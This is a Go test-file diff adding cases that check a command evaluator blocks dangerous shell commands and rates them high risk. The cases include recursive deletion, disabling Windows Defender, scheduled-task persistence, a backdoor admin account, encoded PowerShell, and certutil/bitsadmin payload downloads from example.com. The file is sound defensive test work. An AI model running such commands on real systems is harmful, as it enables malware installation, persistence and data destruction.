@@ -116,3 +116,53 @@ func TestEvaluate_EmptyCommand(t *testing.T) {
 		t.Fatal("empty must be disallowed")
 	}
 }
+
+func TestEvaluate_UnixNewDangerPatterns(t *testing.T) {
+	if runtime.GOOS == "windows" {
+		t.Skip("Skipping Unix-specific test on Windows")
+	}
+	
+	testCases := []string{
+		"find / -name '*.log' -exec rm {} \\;",
+		"find . -type f | xargs rm -f",
+	}
+	
+	for _, tc := range testCases {
+		d := Evaluate(tc, prompt.RiskLow)
+		if d.Allowed {
+			t.Errorf("expected command %q to be blocked", tc)
+		}
+		if d.Risk != prompt.RiskHigh {
+			t.Errorf("expected High risk for %q, got %s", tc, d.Risk)
+		}
+	}
+}
+
+func TestEvaluate_WindowsNewDangerPatterns(t *testing.T) {
+	if runtime.GOOS != "windows" {
+		t.Skip("Skipping Windows-specific test on Unix")
+	}
+	
+	testCases := []string{
+		"bcdedit /set {default} bootstatuspolicy ignoreallfailures",
+		"reg add HKLM\\Software\\Policies\\Microsoft\\WindowsDefender /v DisableAntiSpyware /t REG_DWORD /d 1 /f",
+		"schtasks /create /tn \"Update\" /tr \"C:\\temp\\payload.exe\" /sc daily",
+		"net user backadmin P@ssw0rd123 /add",
+		"powershell -encodedCommand QwBhAGwAYwAuAGUAeABlAA==",
+		"bitsadmin /transfer myjob http://example.com/payload.exe C:\\temp\\payload.exe",
+		"certutil -urlcache -f http://example.com/payload.exe C:\\temp\\payload.exe",
+		"wmic process call create \"powershell.exe\"",
+		"takeown /f C:\\Windows\\System32\\cmd.exe",
+	}
+	
+	for _, tc := range testCases {
+		d := Evaluate(tc, prompt.RiskLow)
+		if d.Allowed {
+			t.Errorf("expected command %q to be blocked", tc)
+		}
+		if d.Risk != prompt.RiskHigh {
+			t.Errorf("expected High risk for %q, got %s", tc, d.Risk)
+		}
+	}
+}
+
